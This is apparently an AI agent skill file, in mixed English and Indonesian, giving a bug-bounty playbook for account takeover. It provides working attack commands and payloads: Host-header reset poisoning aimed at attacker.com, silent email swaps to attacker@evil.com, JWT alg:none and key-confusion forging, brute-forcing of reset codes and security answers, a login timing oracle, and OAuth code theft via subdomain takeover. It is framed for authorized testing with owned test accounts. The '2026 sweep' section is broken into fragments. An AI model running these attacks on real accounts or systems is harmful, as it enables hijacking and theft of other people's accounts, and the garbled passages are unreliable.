---
name: hunt-ato
description: "Hunt account takeover taxonomy — 12 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (forge token to another identity; crypto details → hunt-jwt-crypto), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical."
sources: hackerone_public, public_research
report_count: 7
---

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §A/§F): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`

> **Ordered execution battery (Tier 0→7, run top-to-bottom per target):** `references/ato-path-battery.md` — susunan kerja berjenjang + kill-signal + proof bar tiap tier, biar 12 path ATO dijalankan berurutan, bukan acak.


## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
> 12 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens
```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

**Signal: config claims it enforces verification, endpoint does not.** Storefront/framework stacks ship a
page-level settings flag (Rails/Brightsites: `"force_email_verification": true` in the embedded settings
JSON; other stacks: `require_email_verification`, `email_confirmation_required`,
`email_verified_required`). Grep the rendered page source for it, then test the endpoint anyway. A flag
that is **present but not honoured** is a much stronger report than a missing feature: it proves the
developer intended the control, so triage cannot close it as by-design. Quote the flag verbatim next to
the request that ignores it.

**Serial chain (validated 2026-10-29, Kohl's Insider Shop — Brightsites/Rails storefront):**
1. `PUT /account` with `website_user[email]=<attacker mailbox>` + current password → 200, email changed.
   No mail to the new address, and **no mail to the old address either** — that second absence is what
   makes the swap silent.
2. `POST /account/password` with the new email → 302, "instructions sent".
3. Reset link `GET /account/password/edit?reset_password_token=…` arrives at the **never-verified** mailbox.
4. `PUT /account/password` with that token → new password set; `POST /account/login` succeeds and the
   old password dies.

Also test the restoration step: reverting the email afterwards needs no verification either. State that in
the report — it reproduces the primitive a second time with a benign payload, at no extra cost.

### Path 6: JWT Manipulation
```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle
```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse
```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### Path 10: Pre-Account / Unverified-Account Takeover
The victim's account exists in a pending/unverified state (invite not accepted, signup email never confirmed, or no email on file). Claim it first: register or attach your controlled email to that identity, then let the victim complete SSO/OTP login and inherit the attacker-seeded state — or trigger a reset once your email is attached. Test invite/pending flows and any endpoint that writes an email to an account lacking a confirmed one; confirm the victim, after signing in, lands in the account you seeded. High impact, no token interaction. Disclosed: reports/1679734, reports/394329.

**The mechanism to test first — re-registering an unverified email discards the second caller's password.** A registration handler usually has three branches, and the middle one is the bug:

```python
if existing is None:                  -> create with THIS caller's password
elif not existing.email_verified:     -> resend code, password_hash NOT updated   <-- here
else:                                 -> send "someone tried to register" notice
```

The `elif` exists to stop an attacker overwriting a *verified* user's password. On an
**unverified** account it plants a password the owner activates by verifying their own email —
the most ordinary action a new user takes. Chain: attacker registers `victim@x` with their own
password → victim registers normally → victim verifies → attacker logs in, victim gets `401`.

**The poll loop that removes the race.** `login()` increments the failure counter only on a
*wrong* password and resets it on a correct one. Polling with the attacker's (correct) password
therefore never locks out and returns a stable `403 "Email address not verified."` that flips to
`200 + tokens` the moment the victim verifies. Measured: 6 polls `403`, victim verifies, poll #7
`200`. Deterministic — no timing window, no inbox access.

**Before claiming permanent lockout, audit the recovery path.** Enabling TOTP after takeover only
locks the victim out if reset does not clear 2FA. Prove it from the DB after a *completed* reset
(`totp_enabled` still `True`, `device_hwid_hash` still set, no TOTP-disable endpoint) rather than
inferring from a `200 "Password changed"`.

**Honest limits — this is High, not Critical.** Verified accounts are untouched (the `else`
branch), and the victim can simply register with a different email address; nothing bans it. It
is identity *squatting*, not takeover of an existing account. Writing "the victim's email is
permanently burned" is a retraction waiting to happen.

### Path 11: Optional Identifier on a Verification Endpoint → Unhardened Branch
A schema field typed `Optional` / nullable / defaulted "for backwards compatibility with older
clients" routes the request to a code path that was never given the controls the main path has.
Grep every auth request model for `| None`, `Optional`, or a default, then diff the two branches.

Measured (DedSec CCTV, `POST /auth/verify-email`, `email` optional): omitting `email` skipped
**three** controls simultaneously — no per-account rate limit, no attempt counter (the code was
never burned, so it lived the full 24 h TTL), and no token scoping, so **one guess was compared
against every pending token in the database**. P(hit) becomes `N / 1e6` instead of `1 / 1e6`.

```
POST /auth/verify-email {"token":"<other user's code>"}   # no email field
-> 200, that account verified, all others untouched        # cross-account verify, no inbox
6 x {"token":"000000"} -> attempts stayed 0, used = False
then the real code     -> 200                              # never burned
```

Full chain needs **zero victim action**: squat the email, brute the code on the no-email path,
verify, log in as them. Compute the rate honestly before claiming impact — at 300 guesses/hour
that is ~0.7 %/day against one target, but ~7 accounts/day on a mass squat; and because the
handler scans all pending rows, large N is a self-inflicted DoS that caps the attack.

Fix to lead with: **make the identifier mandatory** (`email: EmailStr`, not `Optional`) — one
line, and the untested legacy branch disappears. Detail + checklist:
`references/registration-verification-ato.md`.

### Path 12: Passwordless / Magic-Link Abuse by Identifier
A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a password (or issues a session) given only an enumerable identifier (phone/email), with no token step. Probe `*passwordless*`, `*magic*`, `*/otp-login`, `*/signup`: does supplying only a phone/email set the password or return a session for that identity? Enumerate identifiers to prove arbitrary-account reach; validate by taking test account B via its number alone. Disclosed: reports/143717.

### ATO Severity Gate
- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
- **Low** — attacker must be MitM, or only self-account impact.

---

## Attack Surface Signals (apa yang membuat ATO mungkin)

- **Reset mailer membangun link dari request** — `Host`, `X-Forwarded-Host`, `X-Host`,
  `X-Forwarded-Server` yang masuk ke template email = poisoning surface.
- **Token muncul di URL, bukan POST body** — bocor lewat `Referer`, log proxy, analytics.
- **Token pendek/numerik/timestamp-based** — entropy rendah = brute-able.
- **Tidak ada invalidasi token lama** saat token baru diminta = reuse window.
- **Email/password berubah tanpa re-auth** — tidak ada `current_password`/step-up.
- **OAuth `state` absen atau statis** — CSRF pada alur login.
- **`redirect_uri` divalidasi longgar** — prefix-match, path-suffix, substring.
- **JWT `alg` dipilih dari header** — `none`, key-confusion, `kid`/`jku`/`jwk` fetch.
- **SAML assertion tanpa cek audience/expiry** — XSW + audience removal.
- **OTP dikirim ke nomor yang dikirim client** — re-routing.
- **Field auth di schema bertipe `Optional`/nullable/default** — membuka cabang kode lama yang
  tak pernah diberi per-akun limit, attempt-counter, atau scoping (Path 11). Grep request model
  untuk `| None` / `Optional`, lalu diff kedua cabang.
- **Registrasi email yang sama dua kali** — cabang "belum verif" sering membuang password
  pemanggil kedua (Path 10).
- **Session tidak dirotasi setelah login** — fixation.
- **Cookie scope terlalu lebar** (`Domain=.target.com`) — subdomain bisa baca.

## Common Root Causes

1. **Trusting request-derived data for identity** — Host header, client-supplied
   `user_id`, `email` in body. The server accepts who the caller *says* they are.
2. **Token as bearer without binding** — token valid untuk siapa pun yang memegangnya,
   tidak terikat ke sesi/device/ip.
3. **Missing step-up on sensitive change** — email/password/2FA berubah tanpa
   memverifikasi identitas lagi.
4. **Comparing instead of validating** — `if (user.input == stored)` alih-alih
   constant-time compare + rate limit + lockout.
5. **Client-side gate only** — UI menyembunyikan tombol admin; server tak cek role.
6. **Second factor optional in practice** — backup code, "remember this device",
   atau OTP yang bisa dilewati dengan memanipulasi response.
7. **Federated trust without claim checks** — `email_verified` diabaikan, audience
   tidak diperiksa, issuer tidak di-pin.

## Bypass Techniques

- **Host-header poisoning** — primary Host swap; kalau gagal, `X-Forwarded-Host` /
  `X-Host` / dual-Host (`Host: target\r\nHost: attacker`).
- **Token leak via Referer** — muat resource off-origin di halaman reset; baca
  `Referer` penuh di log/Collaborator.
- **OTP re-routing** — kirim `phone`/`email` milik attacker pada step verifikasi.
- **`alg:none` + empty signature** — banyak library menerima kalau header bilang none.
- **Key confusion** — RS256 → HS256, sign dengan public key sebagai HMAC secret.
- **`kid` injection** — arahkan ke file statis yang kamu kendalikan (`/dev/null`,
  path traversal ke key已知).
- **`jku`/`jwk` header injection** — server fetch key set dari URL attacker.
- **XSW (XML Signature Wrapping)** — pindahkan signed assertion, tambahkan yang palsu.
- **Audience removal** — hapus `AudienceRestriction` supaya assertion diterima SP lain.
- **Session fixation** — set cookie sesi sebelum login; kalau tak dirotasi, tetap valid.
- **Cross-subdomain cookie** — `Domain=.target.com` + XSS/subdomain-takeover di sub lain.

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Reset password: kirim untuk akun B, **baca email B**, cek domain link | Host poisoning = ATO paling sering dibayar |
| 2 | Token: minta 2 token, cek yang lama masih valid? coba token B untuk akun A | Reuse + cross-account |
| 3 | OAuth: hapus/ubah `state`, manipulasi `redirect_uri`, coba implicit flow | 3 dari 9 path ATO ada di sini |
| 4 | JWT: `alg:none`, RS256→HS256, inject `kid`/`jku`/`jwk` | Satu payload bisa langsung jadi ATO |
| 5 | Email/password change: coba **tanpa re-auth** dan tanpa `current_password` | Silent swap = takeover persisten |
| 6 | Register email sama 2x (akun belum verify): password berubah? Lalu verifikasi **tanpa** field `email` | Pre-hijack + cabang tanpa limit (Path 10/11); cek juga reset tidak membersihkan TOTP |

**Aturan:** semua probe butuh **akun B yang kamu kuasai** (lihat `disposable-auth-identity`
+ `identity_harness.py`). ATO tanpa bukti lintas akun = spekulasi.
## Gate 0 Validation (sebelum lapor ATO)

1. **Akun B nyata & kamu kuasai** — bukan akun sendiri yang "pura-pura korban".

   **Pengecualian: kalau program melarang multi-akun.** Brief yang menyebut *"only interact with your own
   test account"* / *"only interact with your own accounts"* (umum di program retail — Kohl's memuatnya di
   Focus Areas) membuat pembuatan akun kedua pelanggaran aturan, bukan bukti. Jangan bikin akun B.

   Validasi sah di kondisi itu: **satu akun, dua mailbox yang kamu kuasai.** Ubah email akun tes ke mailbox
   kedua, tunjukkan link reset mendarat di mailbox yang **belum terverifikasi**, set password baru, dan
   login berhasil. Itu membuktikan primitif intinya — kontrol verifikasi email tidak ada — tanpa menyentuh
   akun pengguna lain maupun membuat identitas kedua.

   Tulis batasannya secara eksplisit di laporan: *"dampak lintas-pengguna disimpulkan dari primitif yang
   terbukti, bukan didemonstrasikan pada akun pengguna kedua, sesuai aturan program yang membatasi interaksi
   pada akun tes sendiri."* Triager menerima penalaran ini; yang tidak diterima adalah mengklaim sudah
   menyerang akun lain padahal belum.
2. **Takeover terbukti dari sesi/IP/device A** — login sebagai B tanpa kredensial B.
3. **Reproduksi 10 menit** — fresh browser, tanpa state dari percobaan sebelumnya.
4. **Dampak disebut** — bisa baca email B? reset password B? aksi finansial?
5. **Bukan prekondisi tidak realistis** — kalau butuh korban klik + masukin password +
   CAPTCHA, severity turun.
6. **Bukti tersimpan** — request/response + timestamp + marker unik.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** kuasai akun korban

**Teknik pengembangan:** akun admin -> aksi privilegi; sesi korban -> data tenant lain; token API -> aksi finansial

**Eskalasi ke:** `hunt-idor` · `hunt-business-logic` · `hunt-rce`

**Depth target:** L4 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Related Skills & Chains

- **Surface atlas** (`security/bb-audit-launcher/references/ato-idor-ssrf-surface-atlas.md`) — the 31 trigger surfaces for ATO / IDOR-BOLA / SSRF: where to look, what proves it, and the severity per surface. This skill is the depth; the atlas is the coverage checklist.

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.

---

## Reference — PayloadsAllTheThings (extracted 2026-10-17)

`security/bug-bounty/references/pat-techniques/account-takeover.md` (7.3KB, 188 lines) —
PAT "Account Takeover" section: the full ATO taxonomy (credential-stuffing, reset-token
theft, session-fixation, OAuth-token theft, CSRF-to-login) with payload tables.
Raw-payload shelf behind this skill's techniques.
Cadangan versi komunitas: `references/cbh-hunt-skills/hunt-ato.md` (13.4KB).


## 2026 sweep (dork pass 2026-10-18 — 1 repo)

- **CVE-2026-93355 — OIDC `email_verified` claim never checked → persistent takeover** (`InertFluid/cve-2026-93355-lab` ★0)
  - match** — and **never checks the `email_verified` claim**. An attacker who can
  - binding** to the attacker's subject, making the takeover persistent.

---

## Harness 2-identitas (2026-10-18) — bukti takeover lintas akun

Semua 9 path di atas butuh hal yang sama: **akun B yang kamu kuasai, diserang dari
sesi A**. `scripts/identity_harness.py` menyediakan itu:

```bash
python identity_harness.py capture --label a --url https://t/login --data 'u=a&p=x'
python identity_harness.py capture --label b --url https://t/login --data 'u=b&p=x'
# reset/email-change/OTP path: jalankan flow sebagai A, verifikasi dampak ke B
python identity_harness.py diff --label-a a --label-b b --urls https://t/api/me
```

Aturan takluk (dari `redteam-mindset`): akun tes bikinan sendiri, jangan pakai akun
orang lain, jangan sentuh data produksi. Bukti = response B menunjukkan state yang
hanya A yang seharusnya bisa lakukan.

---

## Latihan dulu di lab lokal (2026-10-18)

Sebelum probe di atas dijalankan pada target nyata, tekniknya bisa diverifikasi di
`local-vuln-lab` (Juice Shop :3000 untuk IDOR/ATO, DVWA :4280 untuk RCE/LFI).
Tujuannya: pastikan probe benar-benar bekerja, bukan cuma terlihat benar di dokumen.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Critical = zero/low victim interaction: host-header reset poisoning, JWT forgery ke endpoint victim, lax `redirect_uri` auth-code theft, IDOR-driven email change. High = satu klik email ATAU butuh sesi/cookie yang sudah ada. Low = attacker harus MitM atau hanya dampak akun sendiri. Kalibrasi: rate-limit-only finding tanpa brute yang mendarat = bukan ATO.
